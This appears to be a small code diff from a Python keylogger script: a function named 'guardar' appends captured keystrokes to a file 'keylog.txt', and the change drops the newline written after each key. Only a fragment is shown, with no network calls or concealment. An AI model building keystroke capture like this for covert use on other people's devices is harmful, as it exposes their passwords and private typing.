@@ -2,7 +2,7 @@ import keyboard
 
 def guardar(tecla):
     archivo=open("keylog.txt","a")
-    archivo.write(tecla +"\n")
+    archivo.write(tecla)
     archivo.close()
 
 def presionar (letra):
